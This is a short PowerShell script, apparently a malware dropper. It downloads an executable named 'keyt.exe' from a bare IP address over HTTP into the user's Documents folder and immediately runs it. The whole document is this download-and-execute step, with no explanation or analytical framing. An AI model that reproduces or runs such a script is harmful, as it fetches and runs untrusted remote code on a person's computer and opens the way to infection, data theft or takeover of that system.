
Import-Module BitsTransfer
$path = [environment]::getfolderpath("mydocuments")
Start-BitsTransfer -Source "http://94.102.50.39/keyt.exe" -Destination "$path\keyt.exe"
Invoke-Item  "$path\keyt.exe"

